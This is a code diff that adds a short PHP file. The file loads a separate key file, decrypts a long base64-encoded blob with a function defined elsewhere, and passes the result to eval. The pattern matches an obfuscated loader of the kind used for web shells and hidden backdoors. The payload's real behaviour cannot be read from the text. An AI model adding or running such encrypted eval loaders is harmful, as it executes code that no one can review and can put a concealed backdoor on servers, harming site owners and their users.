@@ -1,0 +1,8 @@
+<?php
+$keyfile="key.inc.php";
+if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
+if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
+if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
+if(file_exists($keyfile)){include_once($keyfile);}else{die("<h2>include: $keyfile not found!</h2>");}
+$e7091="ZkZ5T0VGR0IvS1A2TDh1YkNVZms2RUgrQ0JJVE4ydzFDR00wazJqdi9jeWZ4WjJWYkNuRFY5UVZEN3dCNEg3Wmo5bkxnWDAvc3R2dmIzOGFPMXBQNWhSaTdyYWIrT0lNSk5Yb2JWaVJHdnA2T25vZlAyRlVKUzE2TUdCYTVTVGxRTmVuenVLRnYwV2RpSjcvUmRqRHFKc0VyMG9YSm5NaGI4NFF3aHJ2NHg0SjVSMXhyOG5VbnFUdHVaMG82RUtTSzFCVGJldkZKRHgxeTV1KytRYTZkN2x3RmpFd2RjVHpEWFFlbXdXOE1CMTV4OGR1RmtVUjFRVC94TTd4MmdJVTNwQjdtcVFvc01xZ2dndjBQT2JBZ082RWdRRjJLSTBncWZkZUtGVHpTWEFPWGhYbGl6M3pCSlNFeXhKS3ZmMXhHeWFLeFkybVptSXBETkl4VFhwMnhKQUJOb0RDVVFhUEFobTU1OVJGbGlVeUdxYzVwQk1yazJCdHAzRmVwdUVOcHZabUY2bnpzanF4YkhQdm9IVmlWbDRvWTR5UTRYL0RLZUdVZmNiUGh3dldvMnY4cWJwb01JWXVseTBQMXUzNlR1Q011ODdJV0w4K1A0cHQvYlZwUFhEMXlpVDlGY01rUmpsMTRkeUVneWQ5UGZhdzA5SFpZenBqcEh2eWV5M0pUU1F4OXVjRWd2ZS9xSU0zbDVzNWJuWmR3WlJZTG5keG4xRDF5VUVLbCtDVnd0c01aTVExV3FzTzZVQ2ZjbDU0THZJaVFIakttc1VtSEErd21YclhmSXRiaVZvRFBVNWVYQk56bk1tNjNROU5YcDRDT1RsVitrbTRLVlJqTWtoYXN2Zy92cEs4L00yMnBUNHNuQWVVUWp2SnoxZVJZdmpjY0o2eVFqa1dMUW8xUkNXV2JadVhscEdoZklhakd2eG0=";eval(e7061($e7091));
+?>
